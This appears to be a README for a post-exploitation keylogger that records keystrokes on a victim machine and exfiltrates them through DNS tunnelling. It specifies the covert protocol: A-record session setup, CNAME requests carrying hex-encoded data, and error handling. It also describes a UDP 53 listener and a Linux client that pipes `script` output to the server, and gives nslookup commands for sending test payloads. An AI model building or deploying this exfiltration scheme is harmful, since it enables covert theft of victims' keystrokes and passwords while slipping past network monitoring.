# DNS Keylogger
This post-exploitation keylogger will automatically report a Windows computer's keystrokes.

This takes advantage of DNS tunelling/exfiltration.

# Protocol
## A Record Request
A record requests indicate the start of a "connection." When the server receives them, it will respond with a fake non-reserved IP address where the last octet contains the id of the client.

Concurrent connections cannot exceed 254, and clients are never considered "disconnected."
## CNAME Record Request
CNAME record requests indicate actual data being sent to the server.
It is in the format of `[packet #].[id].[data].[sld].[tld].`

`id` is the id that was established on connection. Data is sent as ASCII data in hex.
## Malformed Record Requests
If the client sends an malformed record request, the server will respond with NXDOMAIN.
## Non-Existant Connections
If the client sends a data packet with an id greater than the # of connections, the server will respond with REFUSED.
## Out of Order Packets
Occurs when client sends a packet with packet_id that doesn't match what is expected. The server responds with FORMERR. Clients and servers should reset their packet numbers to 0. Then the client can resend the packet.
## Dropped Packets
Clients should rely on responses as acknowledgements of received packets. If they do not receive a response, resend the same payload.

# Server
## Listens on UDP port 53 for DNS packets
Looks for A record and CNAME record requests. Once an A record has been received, the rest of the data from the client should be CNAME record requests.

# Client
## Linux
The Linux keylogger is just a bash file. To start the keylogger, run `script --flush -I a.txt`. This will use the script command to send user input to the server. The bash file can be used to send any data piped to it; it just read from stdin, but each time the script is started, a new connection is established.

### Sending Test Requests
You can use `nslookup` to send requests to the server:

`nslookup -query=A 1.example.com 127.0.0.1` sends a connection request to localhost.

`nslookup -query=CNAME 1.1.54686520717569636B2062726F776E20666F782E1B.example.com 127.0.0.1` to send a test message to localhost.

The `sld` can be anything if you're testing on localhost, but you need to put something there.